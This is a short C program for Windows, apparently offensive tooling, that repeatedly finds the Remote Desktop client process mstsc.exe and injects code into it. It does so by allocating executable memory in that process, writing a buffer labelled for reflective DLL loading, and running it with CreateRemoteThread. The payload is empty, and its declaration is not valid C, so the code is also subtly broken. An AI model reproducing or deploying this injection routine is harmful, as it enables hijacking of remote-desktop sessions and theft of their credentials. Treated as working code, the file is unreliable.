#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>

char* process_name = "mstsc.exe";
DWORD pid = 0;
const char* dll_ReflectiveLoading[] = "";
int main(void){
    while(1){
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if ( snapshot == INVALID_HANDLE_VALUE){
            return 0;
        }
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if ( Process32First(snapshot, &pe) ){
            do {
                if ( strcmp(pe.szExeFile, process_name) == 0 ){
                    pid = pe.th32ProcessID;
                    break;
                }
            } while ( Process32Next(snapshot, &pe) );
        }
        CloseHandle(snapshot);
        if ( pid == 0 ){
            printf("[-] Process not found\n");
            return EXIT_FAILURE;
        }
        HANDLE open = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid
        );

        if ( open == NULL){
            printf("[-] OpenProcess failed: %d\n", GetLastError());
            CloseHandle(open);
            return EXIT_FAILURE;
        }

        LPVOID addr = VirtualAllocEx(
            open,
            NULL,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if ( addr == NULL){
            printf("[-] VirtualAlloc failed: %d\n", GetLastError());
            CloseHandle(open);  
            return EXIT_FAILURE;
        }

        BOOL write = WriteProcessMemory(
            open,
            addr,
            dll_ReflectiveLoading,
            sizeof(dll_ReflectiveLoading),
            NULL
        );
        if ( write == FALSE){
            printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
            VirtualFreeEx(open, addr, 0, MEM_RELEASE);
            CloseHandle(open);
            return EXIT_FAILURE;
        }

        HANDLE thread = CreateRemoteThread(
            open,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)addr,
            addr,
            0,
            NULL
        );
        if ( thread == NULL){
            printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
            VirtualFreeEx(open, addr, 0, MEM_RELEASE);
            CloseHandle(open);
            return EXIT_FAILURE;
        }

        WaitForSingleObject(thread, 0xFFFFFFFF);
        CloseHandle(thread);
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        Sleep(1000);
    };
    return EXIT_SUCCESS;
};